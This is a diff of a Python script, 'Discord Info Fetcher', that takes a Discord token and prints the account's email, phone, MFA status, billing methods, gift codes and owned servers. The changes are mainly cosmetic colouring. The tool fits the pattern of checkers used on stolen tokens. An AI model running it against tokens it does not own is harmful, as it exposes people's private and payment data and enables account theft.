@@ -1,39 +1,41 @@
 import requests
 from datetime import datetime, timezone
-
-def main():
-    print("Atom Tools")
+from pystyle import Colors, Colorate
 
 def clear():
     import os
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def ErrorModule(e):
-    print(f"Error importing module: {e}")
+def print_title(title):
+    print(f"{Colors.blue}{'=' * 60}\n{title}\n{'=' * 60}{Colors.reset}")
 
-def Error(e):
-    print(f"An error occurred: {e}")
+def print_error(message):
+    print(f"{Colors.red}Error: {message}{Colors.reset}")
+
+def print_info(message):
+    print(f"{Colors.green}{message}{Colors.reset}")
 
 def display_discord_info(token_discord):
     try:
         headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
+        
         user = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
         r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
-
+        
         status = "Valid" if r.status_code == 200 else "Invalid"
 
         username_discord = user.get('username', "None") + '#' + user.get('discriminator', "None")
         display_name_discord = user.get('global_name', "None")
         user_id_discord = user.get('id', "None")
         email_discord = user.get('email', "None")
-        email_verified_discord = str(user.get('verified', "None"))
-        phone_discord = str(user.get('phone', "None"))
-        mfa_discord = str(user.get('mfa_enabled', "None"))
+        email_verified_discord = "Yes" if user.get('verified') else "No"
+        phone_discord = user.get('phone', "None")
+        mfa_discord = "Yes" if user.get('mfa_enabled') else "No"
         country_discord = user.get('locale', "None")
 
         created_at_discord = "None"
         if 'id' in user:
-            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc)
+            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
 
         nitro_discord = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}.get(user.get('premium_type'), 'None')
 
@@ -48,7 +50,7 @@ def display_discord_info(token_discord):
         banner_discord = user.get('banner', "None")
         banner_color_discord = user.get('banner_color', "None")
         accent_color_discord = user.get("accent_color", "None")
-        nsfw_discord = str(user.get('nsfw_allowed', "None"))
+        nsfw_discord = "Yes" if user.get('nsfw_allowed') else "No"
         linked_users_discord = ' / '.join([str(linked_user) for linked_user in user.get('linked_users', [])]) or "None"
         bio_discord = "\n" + user.get('bio', "None")
 
@@ -89,7 +91,7 @@ def display_discord_info(token_discord):
             codes = [f"Gift: {gift_code['promotion']['outbound_title']}\nCode: {gift_code['code']}" for gift_code in gift_codes]
             gift_codes_discord = '\n\n'.join(codes) if codes else "None"
 
-        print(f"""
+        print(f"""{Colors.blue}
 Status : {status}
 Token : {token_discord}
 Username : {username_discord}
@@ -112,24 +114,25 @@ Flags : {flags_discord}
 Public Flags : {public_flags_discord}
 NSFW : {nsfw_discord}
 Multi-Factor Authentication : {mfa_discord}
-Authenticator Type : {authenticator_types_discord}
+Authenticator Type  : {authenticator_types_discord}
 Billing : {payment_methods_discord}
 Gift Code : {gift_codes_discord}
 Guilds : {guild_count}
 Owner Guilds : {owner_guild_count} {owner_guilds_names}
-Bio : {bio_discord}
+Bio : {bio_discord}{Colors.reset}
         """)
-        
-        input("Press Enter to return to the main menu...")
+
+        input(f"{Colors.yellow}Press Enter to return to the main menu...{Colors.reset}")
 
     except Exception as e:
-        print(f"Error when retrieving information: {e}")
+        print_error(f"Error when retrieving information: {e}")
 
 if __name__ == "__main__":
     clear()
     try:
-        token_discord = input("Enter Discord token: ")
+        print_title("Discord Info Fetcher")
+        token_discord = input(f"{Colors.yellow}Enter Discord token: {Colors.reset}")
         display_discord_info(token_discord)
         clear()
     except Exception as e:
-        Error(e)
+        print_error(e)
